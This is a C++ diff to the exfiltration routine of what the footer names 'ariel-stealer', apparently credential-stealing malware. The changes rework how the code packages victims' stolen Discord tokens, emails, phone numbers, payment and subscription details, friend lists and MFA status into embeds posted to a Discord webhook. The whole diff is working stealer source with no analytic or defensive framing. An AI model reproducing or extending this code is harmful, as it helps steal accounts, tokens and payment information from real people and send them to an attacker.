@@ -523,20 +523,26 @@ result send_discord(const std::string& webhook_url,
         return std::string("{\"name\":\"") + json_escape(name) + "\",\"value\":\"" +
                json_escape(value) + "\",\"inline\":" + (inline_field ? "true" : "false") + "}";
     };
-    const auto code_block = [](const std::string& value) {
-        std::string text = value;
-        if (text.size() > 940) text.resize(940);
-        return std::string("```text\n") + text + "\n```";
+    const auto code_block = [](std::string value) {
+        std::replace(value.begin(), value.end(), '`', '\'');
+        if (value.size() > 940) value.resize(940);
+        return std::string("```text\n") + text_value(value) + "\n```";
+    };
+    const auto inline_code = [](std::string value) {
+        std::replace(value.begin(), value.end(), '`', '\'');
+        if (value.size() > 900) value.resize(900);
+        return std::string("`") + text_value(value) + "`";
     };
     const auto make_embed = [&](const std::string& title,
                                 const std::string& embed_description,
                                 const std::string& fields,
                                 const std::string& thumbnail_url,
-                                const std::string& extra) {
+                                const std::string& extra,
+                                const long long color = 5793242) {
         return std::string("{\"title\":\"") + json_escape(title) + "\","
                "\"url\":\"" + github + "\","
                "\"description\":\"" + json_escape(embed_description) + "\","
-               "\"color\":5793242,"
+               "\"color\":" + std::to_string(color) + ","
                "\"fields\":[" + fields + "],"
                "\"thumbnail\":{\"url\":\"" + json_escape(thumbnail_url) + "\"}" + extra + ","
                "\"footer\":{\"text\":\"ihateapples/ariel-stealer\",\"icon_url\":\"" +
@@ -571,7 +577,7 @@ result send_discord(const std::string& webhook_url,
     base_fields.push_back(field_json("RAM", report.ram, true));
     base_fields.push_back(field_json("Display", report.display, true));
     base_fields.push_back(field_json("Local time", report.local_time, true));
-    base_fields.push_back(field_json("Credentials", std::to_string(report.credentials), true));
+    base_fields.push_back(field_json("Records", std::to_string(report.credentials), true));
     base_fields.push_back(field_json("Discord tokens", std::to_string(report.tokens), true));
     base_fields.push_back(field_json("Valid accounts", std::to_string(valid_accounts), true));
     base_fields.push_back(field_json("Archive", filename, true));
@@ -594,10 +600,56 @@ result send_discord(const std::string& webhook_url,
         if (!account.valid) continue;
         const std::string title = "Discord account " + std::to_string(account_number++);
         const std::string thumbnail_url = account.avatar_url.empty() ? logo : account.avatar_url;
-        const std::string field =
-            field_json(title, code_block(describe_account(account, false)), false);
-        embeds.push_back(make_embed("Ariel - " + title, "Checked Discord account", field,
-                                    thumbnail_url, ""));
+
+        std::string user = account.username;
+        if (!account.discriminator.empty() && account.discriminator != "0")
+            user += "#" + account.discriminator;
+        if (!account.global_name.empty() && account.global_name != user)
+            user += " (" + account.global_name + ")";
+        char accent[16]{};
+        std::snprintf(accent, sizeof(accent), "#%06X",
+                      static_cast<unsigned>(account.accent_color) & 0xFFFFFFu);
+
+        std::vector<std::string> fields;
+        fields.push_back(field_json("Token", code_block(account.token), false));
+        fields.push_back(field_json("Email", inline_code(account.email), true));
+        fields.push_back(field_json("Phone", inline_code(account.phone), true));
+        fields.push_back(field_json("User", inline_code(user), true));
+        fields.push_back(field_json("ID", inline_code(account.id), true));
+        fields.push_back(field_json("Nitro", inline_code(nitro_text(account.premium_type)), true));
+        fields.push_back(field_json("Locale", inline_code(account.locale), true));
+        fields.push_back(field_json("Created", inline_code(account.created), true));
+        fields.push_back(field_json("Verified", inline_code(account.verified ? "yes" : "no"), true));
+        fields.push_back(field_json("MFA", inline_code(account.mfa_enabled ? "yes" : "no"), true));
+        if (account.accent_color > 0)
+            fields.push_back(field_json("Accent color", inline_code(accent), true));
+        fields.push_back(field_json("Badges", inline_code(account.badges), true));
+        fields.push_back(field_json("Flags", inline_code(
+            std::to_string(account.flags ? account.flags : account.public_flags)), true));
+        fields.push_back(field_json("Avatar", code_block(account.avatar_url), false));
+        fields.push_back(field_json("Banner", code_block(account.banner_url), false));
+        fields.push_back(field_json("Guilds (" + std::to_string(account.guild_count) + ")",
+                                    code_block(account.guilds), false));
+        fields.push_back(field_json("Friends (" + std::to_string(account.friend_count) + ")",
+                                    code_block(account.friends), false));
+        fields.push_back(field_json("Payment", code_block(account.payment), false));
+        fields.push_back(field_json("Subscriptions", code_block(account.subscriptions), false));
+        fields.push_back(field_json("Source", code_block(account.source), false));
+        if (!account.error.empty())
+            fields.push_back(field_json("Notes", code_block(util::trim(account.error)), false));
+
+        const size_t chunk_size = 10;
+        for (size_t i = 0; i < fields.size(); i += chunk_size) {
+            const size_t end = std::min(i + chunk_size, fields.size());
+            const std::vector<std::string> chunk(fields.begin() + i, fields.begin() + end);
+            const std::string part = end == fields.size()
+                                         ? ""
+                                         : " (" + std::to_string(i / chunk_size + 1) + ")";
+            const std::string detail = i == 0 ? "Checked Discord account"
+                                              : "Discord account details continued";
+            embeds.push_back(make_embed("Ariel - " + title + part, detail,
+                                        join_fields(chunk), thumbnail_url, "", 0xb143e3));
+        }
     }
 
     if (invalid_accounts) {
